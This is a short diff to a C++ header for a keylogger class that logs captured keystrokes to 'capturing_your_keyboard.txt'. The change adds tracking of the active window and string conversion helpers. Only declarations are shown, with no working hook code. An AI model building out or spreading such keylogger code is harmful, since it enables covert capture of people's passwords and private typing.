@@ -3,6 +3,8 @@
 
 #include <fstream>
 #include <vector>
+#include <Psapi.h>
+#include <string>
 
 using namespace std;
 
@@ -16,10 +18,12 @@ private:
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
 	Keylogger* keylogger;
 	Hook* hook;
-	wofstream logFile;
-	vector<wchar_t>* textBuffer;
+	ofstream logFile;
+	HWND lastActiveWindow;
 
 	void keyboardHandler(wchar_t* key);
-	void writeToFile();
+
+	static char charBuffer[1024];
+	static string wcharToStr(wchar_t* str);
 };
 
